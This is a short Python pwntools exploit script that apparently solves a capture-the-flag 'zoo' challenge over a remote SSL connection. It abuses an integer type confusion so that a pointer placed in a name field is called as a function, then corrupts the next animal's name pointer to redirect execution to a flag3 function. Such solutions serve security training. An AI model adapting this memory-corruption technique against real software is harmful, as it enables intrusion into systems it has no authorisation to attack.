#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('../dist/2_chal')

io = remote('zoo.serviel.fr', 1234, ssl=True)

io.sendlineafter(b'tom nom ? ', p64(exe.sym['add_custom']))

# Abuse int type confusion and use pointer in the name as a function
io.sendlineafter(b'-> ', str(-0x20 // 8).encode())

# Corrupt the name pointer of the next animal
io.sendlineafter(b'animal: ', b'4') # Size 
io.sendlineafter(b'animal: ', b'A'*4 + p64(exe.sym['flag3'])) # sound
io.sendlineafter(b'animal: ', b'toto') # name

# List animals
io.sendlineafter(b'-> ', b'4')

io.interactive()